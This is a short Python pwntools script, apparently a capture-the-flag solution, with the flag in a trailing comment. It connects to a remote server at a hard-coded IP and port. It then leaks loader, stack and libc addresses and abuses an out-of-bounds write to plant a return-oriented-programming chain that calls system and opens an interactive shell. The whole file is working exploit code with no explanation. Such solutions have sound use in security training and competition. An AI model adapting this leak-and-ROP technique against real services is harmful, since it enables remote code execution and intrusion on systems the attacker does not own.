#!/usr/bin/env python3
from pwn import *

p = remote('164.92.176.247',4000)
p.sendlineafter(b':',b'1')
p.sendlineafter(b':',b'504')
p.sendafter(b':',b'A'*0x8)
p.sendlineafter(b':',b'40')
p.sendlineafter(b':',b'1')
p.sendlineafter(b':',b'504')
p.sendafter(b':',b'A'*(0x10) )
p.sendlineafter(b':',b'40')
p.sendlineafter(b':',b'1')
p.sendlineafter(b':',b'504')
p.sendafter(b':',b'A'*(0x18) )
p.sendlineafter(b':',b'40')

p.sendlineafter(b':',b'2')
p.recvuntil(b'A'*0x8)
ldbase = int.from_bytes(p.recvn(6),'little')
ldbase -= 0x21dc18


print(hex(ldbase))
print(hex(ldbase-0x214000))
p.recvuntil(b'A'*0x10)
stackleak = int.from_bytes(p.recvn(6),'little')-0x40
print(hex(stackleak))
p.recvuntil(b'A'*0x18)
libcbase = int.from_bytes(p.recvn(6),'little')-0x92ef3
print(hex(libcbase))
w = (0x100**8)-(stackleak)+ldbase
for i in range(1,8):
	p.sendlineafter(b':',b'1')
	p.sendlineafter(b':',str(w+i).encode())
	p.sendafter(b':',b'\x00'*(0x88+i+1))
	p.sendlineafter(b':',b'1')


rr = p64(libcbase+0x10f75b)
rr+= p64(libcbase+0x1cb42f)
rr+= p64(libcbase+0x58750+44)
rr+= p64(libcbase+0x58750)

input()
p.sendlineafter(b':',b'1')
p.sendlineafter(b':',str(w+i).encode())
p.sendafter(b':',b'\x00'*(0x90)+p64(0xdeebeef)*1+rr)
p.sendlineafter(b':',b'1')

p.interactive()
# FMCTF{23872be04d6f9abca4ab019333546a4f}
# 0x000000000010f75b: pop rdi; ret; 
# 0x58750:system; 
# 0x1cb42f
